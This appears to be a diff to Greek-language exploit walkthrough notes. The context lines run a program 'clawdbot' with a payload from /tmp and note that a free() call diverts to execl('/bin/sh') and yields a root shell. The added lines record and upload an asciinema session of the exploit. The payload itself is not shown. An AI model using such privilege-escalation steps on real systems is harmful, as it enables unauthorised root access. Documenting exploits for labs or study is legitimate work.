@@ -74,3 +74,12 @@
     clawdbot `cat /tmp/payload`
     (τρέχει ολόκληρο το animation του pretend_to_work() αλλά δίνει root)
     (όταν καλείται free(message) → execl("/bin/sh") → root shell)
+
++++++++++++++++++++++++++++++++++ ΕΓΓΡΑΦΗ ++++++++++++++++++++++++++++++++++++
+32) asciinema rec exploit_karagiannis.cast
+
+33) Ctrl+D για τέλος εγγραφής
+
+34) asciinema upload exploit_karagiannis.cast
+
+35) asciinema play exploit_karagiannis.cast
